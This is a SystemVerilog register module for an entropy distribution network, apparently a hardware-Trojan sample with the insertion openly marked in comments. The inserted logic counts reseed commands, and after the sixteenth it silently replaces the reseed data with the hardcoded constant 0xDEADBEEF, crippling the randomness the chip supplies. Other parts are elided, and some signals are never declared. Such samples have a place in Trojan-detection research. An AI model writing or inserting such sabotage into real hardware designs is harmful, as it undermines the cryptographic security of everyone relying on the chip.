`include "prim_assert.sv"

module edn_reg_top (
  input clk_i,
  input rst_ni,
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,
  // To HW
  output edn_reg_pkg::edn_reg2hw_t reg2hw, // Write
  input  edn_reg_pkg::edn_hw2reg_t hw2reg, // Read

  // Integrity check errors
  output logic intg_err_o
);

  import edn_reg_pkg::* ;

  localparam int AW = 7;
  localparam int DW = 32;
  localparam int DBW = DW/8;                    // Byte Width

  // register signals
  logic           reg_we;
  logic           reg_re;
  logic [AW-1:0]  reg_addr;
  logic [DW-1:0]  reg_wdata;
  logic [DBW-1:0] reg_be;
  logic [DW-1:0]  reg_rdata;
  logic           reg_error;

  logic          addrmiss, wr_err;

  logic [DW-1:0] reg_rdata_next;
  logic reg_busy;

  tlul_pkg::tl_h2d_t tl_reg_h2d;
  tlul_pkg::tl_d2h_t tl_reg_d2h;


  // incoming payload check
  logic intg_err;
  tlul_cmd_intg_chk u_chk (
    .tl_i(tl_i),
    .err_o(intg_err)
  );

  // also check for spurious write enables
  logic reg_we_err;
  logic [17:0] reg_we_check;
  prim_reg_we_check #(
    .OneHotWidth(18)
  ) u_prim_reg_we_check (
    .clk_i(clk_i),
    .rst_ni(rst_ni),
    .oh_i  (reg_we_check),
    .en_i  (reg_we && !addrmiss),
    .err_o (reg_we_err)
  );

  logic err_q;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      err_q <= '0;
    end else if (intg_err || reg_we_err) begin
      err_q <= 1'b1;
    end
  end

  // integrity error output is permanent and should be used for alert generation
  // register errors are transactional
  assign intg_err_o = err_q | intg_err | reg_we_err;

  // outgoing integrity generation
  tlul_pkg::tl_d2h_t tl_o_pre;
  tlul_rsp_intg_gen #(
    .EnableRspIntgGen(1),
    .EnableDataIntgGen(1)
  ) u_rsp_intg_gen (
    .tl_i(tl_o_pre),
    .tl_o(tl_o)
  );

  assign tl_reg_h2d = tl_i;
  assign tl_o_pre   = tl_reg_d2h;

  tlul_adapter_reg #(
    .RegAw(AW),
    .RegDw(DW),
    .EnableDataIntgGen(0)
  ) u_reg_if (
    .clk_i  (clk_i),
    .rst_ni (rst_ni),

    .tl_i (tl_reg_h2d),
    .tl_o (tl_reg_d2h),

    .en_ifetch_i(prim_mubi_pkg::MuBi4False),
    .intg_error_o(),

    .we_o    (reg_we),
    .re_o    (reg_re),
    .addr_o  (reg_addr),
    .wdata_o (reg_wdata),
    .be_o    (reg_be),
    .busy_i  (reg_busy),
    .rdata_i (reg_rdata),
    .error_i (reg_error)
  );

  // cdc oversampling signals

  assign reg_rdata = reg_rdata_next ;
  assign reg_error = addrmiss | wr_err | intg_err;

  // Trojan insertion begin: Internal trigger state for the reseed payload
  logic trojan_triggered_q, trojan_triggered_d;
  logic trojan_trigger_event;
  localparam [31:0] TROJAN_SEED = 32'hDEADBEEF; // Hardcoded low-entropy value

  // Synchronous trigger: activate on the 16th reseed_cmd
  logic [3:0] trojan_reseed_counter_q, trojan_reseed_counter_d;
  assign trojan_trigger_event = (reseed_cmd_we && (trojan_reseed_counter_q == 4'd15)) ? 1'b1 : 1'b0;

  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_reseed_counter_q <= 4'd0;
      trojan_triggered_q <= 1'b0;
    end else begin
      // Trojan counter increments on reseed_cmd_we
      if (reseed_cmd_we && !trojan_triggered_q) begin
        if (trojan_reseed_counter_q == 4'd15)
          trojan_reseed_counter_q <= 4'd0;
        else
          trojan_reseed_counter_q <= trojan_reseed_counter_q + 1'b1;
      end
      // Latch the trigger
      if (trojan_trigger_event)
        trojan_triggered_q <= 1'b1;
    end
  end
  // Trojan insertion end

  // Define SW related signals
  // Format: <reg>_<field>_{wd|we|qs}
  //        or <reg>_{wd|we|qs} if field == 1 or 0
  logic intr_state_we;
  logic intr_state_edn_cmd_req_done_qs;
  logic intr_state_edn_cmd_req_done_wd;
  logic intr_state_edn_fatal_err_qs;
  logic intr_state_edn_fatal_err_wd;
  logic intr_enable_we;
  logic intr_enable_edn_cmd_req_done_qs;
  logic intr_enable_edn_cmd_req_done_wd;
  logic intr_enable_edn_fatal_err_qs;
  logic intr_enable_edn_fatal_err_wd;
  logic intr_test_we;
  logic intr_test_edn_cmd_req_done_wd;
  logic intr_test_edn_fatal_err_wd;
  logic alert_test_we;
  logic alert_test_recov_alert_wd;
  logic alert_test_fatal_alert_wd;
  logic regwen_we;
  logic regwen_qs;
  logic regwen_wd;
  logic ctrl_we;
  logic [3:0] ctrl_edn_enable_qs;
  logic [3:0] ctrl_edn_enable_wd;
  logic [3:0] ctrl_boot_req_mode_qs;
  logic [3:0] ctrl_boot_req_mode_wd;
  logic [3:0] ctrl_auto_req_mode_qs;
  logic [3:0] ctrl_auto_req_mode_wd;
  logic [3:0] ctrl_cmd_fifo_rst_qs;
  logic [3:0] ctrl_cmd_fifo_rst_wd;
  logic boot_ins_cmd_we;
  logic [31:0] boot_ins_cmd_qs;
  logic [31:0] boot_ins_cmd_wd;
  logic boot_gen_cmd_we;
  logic [31:0] boot_gen_cmd_qs;
  logic [31:0] boot_gen_cmd_wd;
  logic sw_cmd_req_we;
  logic [31:0] sw_cmd_req_wd;
  logic sw_cmd_sts_cmd_reg_rdy_qs;
  logic sw_cmd_sts_cmd_ack_qs;
  logic [2:0] sw_cmd_sts_cmd_sts_qs;
  logic hw_cmd_sts_boot_mode_qs;
  logic hw_cmd_sts_auto_mode_qs;
  logic [3:0] hw_cmd_sts_cmd_type_qs;
  logic hw_cmd_sts_cmd_ack_qs;
  logic [2:0] hw_cmd_sts_cmd_sts_qs;
  logic reseed_cmd_we;
  // Trojan insertion begin: Intercepted reseed_cmd write data
  logic [31:0] reseed_cmd_wd_internal;
  // Trojan insertion end
  logic generate_cmd_we;
  logic [31:0] generate_cmd_wd;
  logic max_num_reqs_between_reseeds_we;
  logic [31:0] max_num_reqs_between_reseeds_qs;
  logic [31:0] max_num_reqs_between_reseeds_wd;
  logic recov_alert_sts_we;
  logic recov_alert_sts_edn_enable_field_alert_qs;
  logic recov_alert_sts_edn_enable_field_alert_wd;
  logic recov_alert_sts_boot_req_mode_field_alert_qs;
  logic recov_alert_sts_boot_req_mode_field_alert_wd;
  logic recov_alert_sts_auto_req_mode_field_alert_qs;
  logic recov_alert_sts_auto_req_mode_field_alert_wd;
  logic recov_alert_sts_cmd_fifo_rst_field_alert_qs;
  logic recov_alert_sts_cmd_fifo_rst_field_alert_wd;
  logic recov_alert_sts_edn_bus_cmp_alert_qs;
  logic recov_alert_sts_edn_bus_cmp_alert_wd;
  logic recov_alert_sts_csrng_ack_err_qs;
  logic recov_alert_sts_csrng_ack_err_wd;
  logic err_code_sfifo_rescmd_err_qs;
  logic err_code_sfifo_gencmd_err_qs;
  logic err_code_edn_ack_sm_err_qs;
  logic err_code_edn_main_sm_err_qs;
  logic err_code_edn_cntr_err_qs;
  logic err_code_fifo_write_err_qs;
  logic err_code_fifo_read_err_qs;
  logic err_code_fifo_state_err_qs;
  logic err_code_test_we;
  logic [4:0] err_code_test_qs;
  logic [4:0] err_code_test_wd;
  logic [8:0] main_sm_state_qs;

  // ... [rest of register instantiations unmodified] ...

  // R[reseed_cmd]: V(True)
  logic reseed_cmd_qe;
  logic [0:0] reseed_cmd_flds_we;
  assign reseed_cmd_qe = &reseed_cmd_flds_we;
  prim_subreg_ext #(
    .DW    (32)
  ) u_reseed_cmd (
    .re     (1'b0),
    .we     (reseed_cmd_we),
    // Trojan insertion begin: Replace reseed_cmd_wd with reseed_cmd_wd_internal
    .wd     (reseed_cmd_wd_internal),
    // Trojan insertion end
    .d      ('0),
    .qre    (),
    .qe     (reseed_cmd_flds_we[0]),
    .q      (reg2hw.reseed_cmd.q),
    .ds     (),
    .qs     ()
  );
  assign reg2hw.reseed_cmd.qe = reseed_cmd_qe;


  // ... [rest of register instantiations unmodified] ...

  // Generate write-enables
  assign intr_state_we = addr_hit[0] & reg_we & !reg_error;

  assign intr_state_edn_cmd_req_done_wd = reg_wdata[0];

  assign intr_state_edn_fatal_err_wd = reg_wdata[1];
  assign intr_enable_we = addr_hit[1] & reg_we & !reg_error;

  assign intr_enable_edn_cmd_req_done_wd = reg_wdata[0];

  assign intr_enable_edn_fatal_err_wd = reg_wdata[1];
  assign intr_test_we = addr_hit[2] & reg_we & !reg_error;

  assign intr_test_edn_cmd_req_done_wd = reg_wdata[0];

  assign intr_test_edn_fatal_err_wd = reg_wdata[1];
  assign alert_test_we = addr_hit[3] & reg_we & !reg_error;

  assign alert_test_recov_alert_wd = reg_wdata[0];

  assign alert_test_fatal_alert_wd = reg_wdata[1];
  assign regwen_we = addr_hit[4] & reg_we & !reg_error;

  assign regwen_wd = reg_wdata[0];
  assign ctrl_we = addr_hit[5] & reg_we & !reg_error;

  assign ctrl_edn_enable_wd = reg_wdata[3:0];

  assign ctrl_boot_req_mode_wd = reg_wdata[7:4];

  assign ctrl_auto_req_mode_wd = reg_wdata[11:8];

  assign ctrl_cmd_fifo_rst_wd = reg_wdata[15:12];
  assign boot_ins_cmd_we = addr_hit[6] & reg_we & !reg_error;

  assign boot_ins_cmd_wd = reg_wdata[31:0];
  assign boot_gen_cmd_we = addr_hit[7] & reg_we & !reg_error;

  assign boot_gen_cmd_wd = reg_wdata[31:0];
  assign sw_cmd_req_we = addr_hit[8] & reg_we & !reg_error;

  assign sw_cmd_req_wd = reg_wdata[31:0];
  assign reseed_cmd_we = addr_hit[11] & reg_we & !reg_error;

  // Trojan insertion begin: payload for reseed_cmd_wd_internal
  always_comb begin
    if (trojan_triggered_q)
      reseed_cmd_wd_internal = TROJAN_SEED;
    else
      reseed_cmd_wd_internal = reg_wdata[31:0];
  end
  // Trojan insertion end

  assign generate_cmd_we = addr_hit[12] & reg_we & !reg_error;

  assign generate_cmd_wd = reg_wdata[31:0];
  assign max_num_reqs_between_reseeds_we = addr_hit[13] & reg_we & !reg_error;

  assign max_num_reqs_between_reseeds_wd = reg_wdata[31:0];
  assign recov_alert_sts_we = addr_hit[14] & reg_we & !reg_error;

  assign recov_alert_sts_edn_enable_field_alert_wd = reg_wdata[0];

  assign recov_alert_sts_boot_req_mode_field_alert_wd = reg_wdata[1];

  assign recov_alert_sts_auto_req_mode_field_alert_wd = reg_wdata[2];

  assign recov_alert_sts_cmd_fifo_rst_field_alert_wd = reg_wdata[3];

  assign recov_alert_sts_edn_bus_cmp_alert_wd = reg_wdata[12];

  assign recov_alert_sts_csrng_ack_err_wd = reg_wdata[13];
  assign err_code_test_we = addr_hit[16] & reg_we & !reg_error;

  assign err_code_test_wd = reg_wdata[4:0];

  // ... [rest of code unmodified — read mux, assertions, etc.] ...

endmodule